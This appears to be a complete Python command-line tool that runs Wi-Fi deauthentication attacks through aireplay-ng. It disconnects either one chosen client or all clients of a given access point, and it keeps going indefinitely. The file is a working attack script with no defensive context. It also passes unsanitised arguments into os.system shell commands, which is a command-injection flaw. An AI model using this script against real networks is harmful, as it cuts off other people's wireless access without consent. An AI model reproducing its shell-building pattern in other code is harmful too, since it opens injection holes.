import os
import sys

def deauth_device(target_mac, ap_mac, interface):
    """Deauth a specific device."""
    print(f"Deauthenticating device: {target_mac} from AP: {ap_mac} on interface: {interface}")
    # Replace the command below with the actual logic for deauthing
    os.system(f"aireplay-ng --deauth 0 -a {ap_mac} -c {target_mac} {interface}")

def deauth_all(ap_mac, interface):
    """Deauth all devices from the specified AP."""
    print(f"Deauthenticating all devices from AP: {ap_mac} on interface: {interface}")
    # Replace the command below with the actual logic for deauthing
    os.system(f"aireplay-ng --deauth 0 -a {ap_mac} {interface}")

if __name__ == "__main__":
    # Read command-line arguments
    mode = sys.argv[1]  # "device" or "all"
    ap_mac = sys.argv[2]
    interface = sys.argv[3]

    if mode == "device":
        target_mac = sys.argv[4]
        deauth_device(target_mac, ap_mac, interface)
    elif mode == "all":
        deauth_all(ap_mac, interface)
    else:
        print("Invalid mode. Use 'device' or 'all'.")
